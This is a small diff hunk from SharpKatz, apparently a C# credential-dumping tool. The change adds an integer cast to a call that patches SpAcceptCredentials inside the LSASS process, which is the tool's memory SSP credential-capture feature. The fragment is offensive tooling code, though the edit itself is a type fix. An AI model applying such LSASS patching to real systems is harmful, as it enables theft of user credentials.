@@ -553,7 +553,7 @@ namespace SharpKatz
                         Console.WriteLine("   [-] msv1_0.dll not found in LSASS modules");
                         return;
                     }
-                    Module.MemSsp.PatchSpAcceptCredentials(hProcess, lsassmsv1, osHelper.build);
+                    Module.MemSsp.PatchSpAcceptCredentials(hProcess, lsassmsv1, (int)osHelper.build);
                 }
                 else if (command.Equals("sekurlsadpapi"))
                 {
